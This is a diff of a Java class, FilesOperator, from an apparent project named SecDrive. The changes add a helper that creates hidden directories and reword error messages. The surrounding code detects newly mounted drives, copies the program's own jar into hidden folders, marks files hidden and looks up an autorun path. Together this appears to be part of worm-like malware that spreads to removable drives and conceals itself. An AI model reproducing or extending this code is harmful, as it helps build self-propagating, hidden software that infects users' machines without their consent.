@@ -12,9 +12,23 @@ import java.io.BufferedWriter;
 import java.security.CodeSource;
 
 public class FilesOperator {
-    static File archive = new File("C:/temp/secDrive");
+    static File archive = createPath("D:/temp/secDrive", true);
     static File[] drivesList = File.listRoots();
 
+    public static File createPath(String pathname, boolean hidden) {
+        File path = new File(pathname);
+        try{
+            if (!path.exists()) {
+                Files.createDirectory(path.toPath());
+                if (hidden) hideFile(path);
+                System.out.println("Path created = " + path.toPath());
+            }
+        }catch (IOException e){
+            System.out.println("Upc, Can't crete a dir "+path.getAbsolutePath());
+            e.printStackTrace();
+        }
+        return path;
+    }
     public static void driveChanged() {
         if(File.listRoots().length > drivesList.length){
             System.out.println("Drive mounted!");
@@ -65,7 +79,7 @@ public class FilesOperator {
         copyJarFile(FilesOperator.archive.toString(), false);
     }
     private static void copyJarFile(String destination, boolean hidden){
-
+        createPath(destination, true);
         try{
             File jarFile = new File(getJarFilePath(SecDrive.class));
             File destJarFile = new File(destination + "/" + jarFile.getName());
@@ -81,18 +95,13 @@ public class FilesOperator {
     public static void copy(File from, File to, boolean hidden){
         File path = to.getParentFile();
         try {
-            if (!path.exists()) {
-                Files.createDirectory(path.toPath());
-                if(hidden) hideFile(path);
-                System.out.println("Path created = " + path.toPath());
-            }
+            createPath(path.getAbsolutePath(), true);
             Files.copy(from.toPath(), to.toPath() , StandardCopyOption.REPLACE_EXISTING);
             if(hidden) hideFile(to);
             System.out.println("File copied to = " + to);
 
         } catch (IOException ioe){
-            ioe.printStackTrace();
-
+            System.out.println("Ups, Can't copy file to "+to.getAbsolutePath());
         }
 
     }
@@ -118,7 +127,7 @@ public class FilesOperator {
             System.out.println("File saved: "+ file.getAbsolutePath());
             return file;
         }catch(IOException ex){
-            System.out.println("Can't save file "+ file.getAbsolutePath());
+            System.out.println("Ups, Can't SaveFile "+ file.getAbsolutePath());
         }
         return null;
     }
@@ -134,7 +143,7 @@ public class FilesOperator {
             System.out.println("File saved: "+ file.getAbsolutePath());
             return file;
         } catch (IOException ioe){
-            System.out.println("Can't save file "+ file.getAbsolutePath());
+            System.out.println("Ups, Can't SaveFile from BufferReader "+ file.getAbsolutePath());
         }
         return null;
     }
@@ -142,7 +151,7 @@ public class FilesOperator {
         try {
             Files.setAttribute(file.toPath(), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
         } catch (IOException e) {
-            e.printStackTrace();
+            System.out.println("Ups, Can't hide file "+file.getAbsolutePath());
         }
     }
     private static File getAutorunPath(){
